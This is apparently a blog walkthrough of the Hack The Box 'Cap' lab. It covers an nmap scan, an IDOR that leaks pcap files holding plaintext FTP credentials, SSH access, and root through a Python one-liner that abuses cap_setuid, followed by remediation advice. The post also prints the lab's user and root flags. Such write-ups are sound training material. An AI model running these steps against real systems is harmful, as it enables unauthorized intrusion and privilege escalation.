# Cap HTB Machine Walk-Through!

\*\*\*IF YOU DO NOT HAVE AN ACCOUNT CLICK HERE TO READ THE FULL-STORY!\*\*\*

---

### Cap HTB Machine Walk-Through!

<a href="https://medium.com/@nmullenski05102016/cap-htb-machine-walk-through-e6187005bf9d?sk=489bd3776a2b9fbc3b7208d80771fb48" class="markup--anchor markup--p-anchor" data-href="https://medium.com/@nmullenski05102016/cap-htb-machine-walk-through-e6187005bf9d?sk=489bd3776a2b9fbc3b7208d80771fb48" target="_blank">***IF YOU DO NOT HAVE AN ACCOUNT CLICK HERE TO READ THE FULL-STORY!***</a>

![](https://cdn-images-1.medium.com/max/800/1*htyL7qXyY3fXxNTGz9qLdw.png)
<figcaption>K70n0s510</figcaption>

### **Executive Summary**

The Cap machine (10.10.10.245) is an easy-difficulty Linux target that was successfully compromised, leading to full administrative control (root access).

The initial entry point leveraged a critical **Insecure Direct Object Reference** **(IDOR)** vulnerability in the target’s web application, allowing an unauthenticated attacker to download sensitive network packet capture files **(.pcap)** intended for other users. Analysis of these captures revealed plaintext credentials for the user nathan, granting initial access via **SSH**.

Privilege escalation to root was achieved by exploiting a system misconfiguration: the Python 3 binary was found to possess the **cap_setuid** Linux capability. This capability was leveraged to execute a script that arbitrarily set the effective **User ID** to 0 **(root)**, securing complete administrative control over the system.

### **1.0 Initial Foothold**

#### **1.1 Reconnaissance and Enumeration:**

- <span id="c9db">The assessment began with a full **TCP** port scan using **Nmap** to identify all open services and gather version information on the target, 10.10.10.245.</span>

```
┌──(achilles㉿Nicholas)-[~/HTB/Labs/Cap]
└─$ nmap -sV -sC -A -vvv 10.10.10.245 -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-29 12:58 EST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:58
Completed NSE at 12:58, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:58
Completed NSE at 12:58, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:58
Completed NSE at 12:58, 0.00s elapsed
Initiating Ping Scan at 12:58
Scanning 10.10.10.245 [4 ports]
Completed Ping Scan at 12:58, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:58
Completed Parallel DNS resolution of 1 host. at 12:58, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 12:58
Scanning 10.10.10.245 [65535 ports]
Discovered open port 80/tcp on 10.10.10.245
Discovered open port 21/tcp on 10.10.10.245
Discovered open port 22/tcp on 10.10.10.245
SYN Stealth Scan Timing: About 22.92% done; ETC: 13:00 (0:01:44 remaining)
SYN Stealth Scan Timing: About 44.68% done; ETC: 13:00 (0:01:16 remaining)
SYN Stealth Scan Timing: About 68.89% done; ETC: 13:00 (0:00:41 remaining)
Completed SYN Stealth Scan at 13:00, 129.69s elapsed (65535 total ports)
Initiating Service scan at 13:00
Scanning 3 services on 10.10.10.245
Completed Service scan at 13:00, 6.23s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.10.10.245
Initiating Traceroute at 13:00
Completed Traceroute at 13:00, 0.10s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 13:00
Completed Parallel DNS resolution of 2 hosts. at 13:00, 0.00s elapsed
DNS resolution of 2 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.10.10.245.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:00
Completed NSE at 13:01, 3.90s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:01
Completed NSE at 13:01, 0.72s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:01
Completed NSE at 13:01, 0.00s elapsed
Nmap scan report for 10.10.10.245
Host is up, received echo-reply ttl 63 (0.065s latency).
Scanned at 2025-11-29 12:58:40 EST for 142s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2vrva1a+HtV5SnbxxtZSs+D8/EXPL2wiqOUG2ngq9zaPlF6cuLX3P2QYvGfh5bcAIVjIqNUmmc1eSHVxtbmNEQjyJdjZOP4i2IfX/RZUA18dWTfEWlNaoVDGBsc8zunvFk3nkyaynnXmlH7n3BLb1nRNyxtouW+q7VzhA6YK3ziOD6tXT7MMnDU7CfG1PfMqdU297OVP35BODg1gZawthjxMi5i5R1g3nyODudFoWaHu9GZ3D/dSQbMAxsly98L1Wr6YJ6M6xfqDurgOAl9i6TZ4zx93c/h1MO+mKH7EobPR/ZWrFGLeVFZbB6jYEflCty8W8Dwr7HOdF1gULr+Mj+BcykLlzPoEhD7YqjRBm8SHdicPP1huq+/3tN7Q/IOf68NNJDdeq6QuGKh1CKqloT/+QZzZcJRubxULUg8YLGsYUHd1umySv4cHHEXRl7vcZJst78eBqnYUtN3MweQr4ga1kQP4YZK5qUQCTPPmrKMa9NPh1sjHSdS8IwiH12V0=
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqG/RCH23t5Pr9sw6dCqvySMHEjxwCfMzBDypoNIMIa8iKYAe84s/X7vDbA9T/vtGDYzS+fw8I5MAGpX8deeKI=
|   256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPbLTiQl+6W0EOi8vS+sByUiZdBsuz0v/7zITtSuaTFH
80/tcp open  http    syn-ack ttl 63 Gunicorn
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET
|_http-server-header: gunicorn
|_http-title: Security Dashboard
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/29%OT=21%CT=1%CU=40447%PV=Y%DS=2%DC=T%G=Y%TM=692B34
OS:DE%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST
OS:11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Uptime guess: 27.588 days (since Sat Nov  1 23:54:29 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   86.34 ms 10.10.14.1
2   77.89 ms 10.10.10.245

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:01
Completed NSE at 13:01, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:01
Completed NSE at 13:01, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:01
Completed NSE at 13:01, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 143.16 seconds
           Raw packets sent: 66362 (2.921MB) | Rcvd: 65775 (2.632MB)
```

• **Port 21 (FTP)** is open and running **vsftpd 3.0.3.** No anonymous login detected.\
• **Port 22 (SSH**) is open and running **OpenSSH 8.2p1** on Ubuntu. Useful for post-exploitation if credentials are found.\
• **Port 80 (HTTP**) is open and running **Gunicorn**. The web title is “Security Dashboard”, suggesting a custom Python-based app, likely Flask.

- <span id="d2f5">Gunicorn indicates a Python web stack. The app only supports OPTIONS, HEAD, and GET methods. No POST or PUT endpoints detected at this stage.</span>
- <span id="1947">OS fingerprinting shows a Linux kernel between versions 4.15 and 5.19. The SSH banner confirms an Ubuntu-based host.</span>

#### **1.2 Web Application Analysis and IDOR Vulnerability:**

The web application on Port **80**, labeled **“Security Dashboard,”** was manually inspected. The site appeared to be an interface for viewing or managing network captures.

Manual testing of the application’s URL structure identified a download feature susceptible to an I**nsecure Direct Object Reference (IDOR)** vulnerability. The download link utilized a numerical identifier:

- <span id="5f82">Vulnerable URL Pattern: <a href="http://10.10.10.245/download.php?file_id=X" class="markup--anchor markup--li-anchor" data-href="http://10.10.10.245/download.php?file_id=X" rel="nofollow noopener" target="_blank"><strong>http://10.10.10.245/d</strong></a>**ata/1**</span>

By manipulating the file_id parameter, it was possible to access files not intended for the current unauthenticated session. Specifically, iterating through the numerical IDs allowed the attacker to download highly sensitive packet capture files **(.pcap)** generated for administrative or other users.

![](https://cdn-images-1.medium.com/max/800/1*KKDSRc9zU9NcAN4wHZ44bg.png)
<figcaption>IDOR in url from /1 — /0 gave me admin .pcap files access for download..</figcaption>

![](https://cdn-images-1.medium.com/max/800/1*Qnxta_BRbSAquRqhjvuirw.png)

#### **1.3 Exploitation and Gaining User Access:**

A critical packet capture file, presumably belonging to an administrator, was successfully downloaded via the IDOR vulnerability.

- <span id="e762">**Packet Analysis:** The downloaded .pcap file was opened and analyzed using Wireshark.</span>
- <span id="33c1">**Credential Discovery:** Analysis focused on clear-text authentication protocols. Filtering for the File Transfer Protocol (FTP) revealed a full authentication exchange.</span>
- <span id="bea8">**Result:** The analysis exposed the plaintext credentials for the user nathan.</span>

This valid credential set was used to establish initial access to the system via the secure shell (SSH) service:

```
──(achilles㉿Nicholas)-[~/HTB/Labs/Cap]
└─$ ssh nathan@10.10.10.245
The authenticity of host '10.10.10.245 (10.10.10.245)' can't be established.
ED25519 key fingerprint is: SHA256:UDhIJpylePItP3qjtVVU+GnSyAZSr+mZKHzRoKcmLUI
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.245' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
nathan@10.10.10.245's password:
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Nov 29 20:22:34 UTC 2025

  System load:           0.0
  Usage of /:            36.6% of 8.73GB
  Memory usage:          21%
  Swap usage:            0%
  Processes:             221
  Users logged in:       0
  IPv4 address for eth0: 10.10.10.245
  IPv6 address for eth0: dead:beef::250:56ff:feb0:9456

  => There is 1 zombie process.

63 updates can be applied immediately.
42 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu May 27 11:21:27 2021 from 10.10.14.7
nathan@cap:~$ cat user.txt
0edc3bd4b6194ffc2c8d41e5b1ea34db
nathan@cap:~$

```

#### **2.0 Privilege Escalation** (User to Root)

- <span id="4573">With initial access secured as the low-privilege user nathan, the next objective was to perform **Local Privilege Escalation (LPE)**. This phase involves systematic enumeration to identify misconfigurations, vulnerable files, or kernel exploits that could grant a shell with root privileges.</span>

#### **2.1 Local System Enumeration:**

- <span id="15f5">Standard enumeration tools and scripts were run to check for common **LPE** vectors, including sudo permissions, **SUID/SGID** binaries, cron jobs, and kernel vulnerabilities.</span>
- <span id="0f37">The **getcap** command was used to check for binaries with special Linux Capabilities that could allow non-root users to perform privileged operations.</span>

```
# Search for binaries with special capabilities
$ getcap -r / 2>/dev/null
```

This scan yielded a critical finding: the standard Python 3 binary had the cap_setuid capability enabled:

```
nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip  <------This one!!
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

#### **2.2 Exploitation: The cap_setuid Capability:**

The **cap_setuid** capability grants a process the ability to change its effective user **ID (EUID)** to any user **ID**, including **0 (root)**, without requiring the full root password or being a member of the sudo group. This is a severe misconfiguration.

**Exploit Procedure**

The capability was leveraged by executing a short Python script designed to change the process’s **EUID** to root and then spawn a privileged shell.

1.  <span id="1613">**Exploit Code:** The following Python code was run on the target machine:</span>

```
import os
# Set the effective user ID to 0 (root)
os.setuid(0)
# Execute a bash shell with the new root privileges
os.system('/bin/bash')
```

2\. **Execution and Shell Upgrade:** Running this script immediately escalated the session to a root shell, securing full administrative control over the machine:

```
nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
root@cap:~# cat /root/root.txt
b569b39951a82caa4f5cc576e44ca013
root@cap:~#

```

#### **3.0 Conclusion and Remediation**

#### **3.1 Summary of Findings and Impact:**

The penetration test of the Cap machine revealed a critical chain of vulnerabilities that allowed for a complete system compromise, escalating from an unauthenticated web user to the root administrator in less than two steps. The initial vector, an Insecure Direct Object Reference (IDOR) vulnerability, granted unauthenticated access to sensitive network packet capture files (.pcap). This led directly to the exposure of clear-text login credentials for the user nathan. The final step leveraged a severe system misconfiguration: the presence of the cap_setuid Linux capability on the Python 3 binary. This privilege abuse allowed the attacker to bypass standard access controls and elevate privileges to UID 0 (root). The overall impact of these vulnerabilities is High, as they collectively allow for data theft, complete control over the system, and potential use of the compromised machine as a pivot point for further attacks on the internal network.

#### **3.2 Priority Remediation Recommendations:**

Immediate action must be taken to break the critical path leading to compromise. The most urgent fix is the removal of the misplaced cap_setuid capability from the Python 3 binary (/usr/bin/python3.8). This capability should only be granted to binaries strictly requiring it for limited, specific functions, which is not the case here. This can be resolved on the target system using the command: setcap -r /usr/bin/python3.8. Simultaneously, the web application must be patched to eliminate the IDOR vulnerability. This involves implementing server-side authorization checks to verify that the session requesting a .pcap file is the legitimate owner or has the necessary administrative permissions. Relying solely on numerical file IDs is inherently insecure and must be replaced with UUIDs or properly mapped authorization tokens.

#### **3.3 Long-Term Security Hardening:**

To prevent similar issues in the future and improve the overall security posture, a set of long-term hardening steps should be implemented. Firstly, clear-text authentication protocols like **FTP** should be disabled or strictly firewalled to prevent credentials from being exposed in easily captured network traffic. All file transfer operations should be enforced over secure, encrypted channels such as SFTP or SCP. Secondly, a comprehensive Linux capability audit should be conducted across the system to identify any other binaries that possess excessive or unnecessary capabilities. Lastly, all custom web applications, like the “Security Dashboard,” should undergo regular, thorough security code reviews to catch logic flaws, such as the IDOR, before they are deployed to production environments. Addressing these issues will significantly enhance the system’s resilience against common and advanced exploitation techniques.

#### **4.0 Final Thoughts & Contact info:**

> **Isaiah 41:10**

> “Do not fear, for I am with you;\
> do not be dismayed, for I am your God.\
> I will strengthen you and help you;\
> I will uphold you with my righteous right hand.”

This verse continues to be one of my favorites and one i will continue to go to for wisdom, strength, and courage. it’s about:

- <span id="e184">**Courage** when things feel chaotic</span>
- <span id="fa8c">**Strength** when you’re exhausted</span>
- <span id="6037">**Support** when you’re on your own grinding through problems. but remember we’re not alone.. jesus is always here for us and reach out to someone like me (Hypothetically) but seriously… and you would be surprised who would be willing to listen and lend their support!! You’re not alone!!</span>

**Contact Info**

- <span id="72af">Discord= <a href="https://discord.gg/We99mDNE" class="markup--anchor markup--li-anchor" data-href="https://discord.gg/We99mDNE" rel="noopener" target="_blank">HTB/CTF Study Server</a></span>
- <span id="b122">Linkedin=<a href="http://www.linkedin.com/in/nick-mullenski-9a5980367" class="markup--anchor markup--li-anchor" data-href="http://www.linkedin.com/in/nick-mullenski-9a5980367" rel="nofollow noopener" target="_blank">www.linkedin.com/in/nick-mullenski-9a5980367</a></span>
- <span id="03f9">HTB-CTF-Team=Kr0nos510</span>

By <a href="https://medium.com/@nicholasmullenski" class="p-author h-card">Nicholas Mullenski</a> on [November 29, 2025](https://medium.com/p/e6187005bf9d).

<a href="https://medium.com/@nicholasmullenski/cap-htb-machine-walk-through-e6187005bf9d" class="p-canonical">Canonical link</a>

Exported from [Medium](https://medium.com) on September 1, 2026.
